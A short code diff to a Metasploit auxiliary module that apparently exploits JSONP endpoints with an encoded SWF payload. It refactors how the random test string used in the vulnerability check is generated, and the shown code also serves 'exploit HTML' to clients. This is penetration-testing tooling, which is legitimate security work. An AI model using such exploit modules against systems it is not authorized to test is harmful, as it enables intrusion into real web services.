@@ -65,6 +65,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def check
+    test_string = Rex::Text.rand_text_alphanumeric(encoded_swf.length)
     io = open(exploit_url(test_string))
     if io.read.start_with? test_string
       Msf::Exploit::CheckCode::Vulnerable
@@ -90,12 +91,6 @@ class Metasploit3 < Msf::Auxiliary
       print_status "Serving exploit HTML"
       send_response_html(cli, exploit_html)
     end
-  end
-
-  # Generates an alphanumeric test string for checking that the JSONP endpoint
-  #   allows for long enough callback function names.
-  def test_string
-    @test_string ||= Rex::Text.rand_text_alphanumeric(encoded_swf.length)
   end
 
   def exploit_url(data_payload)
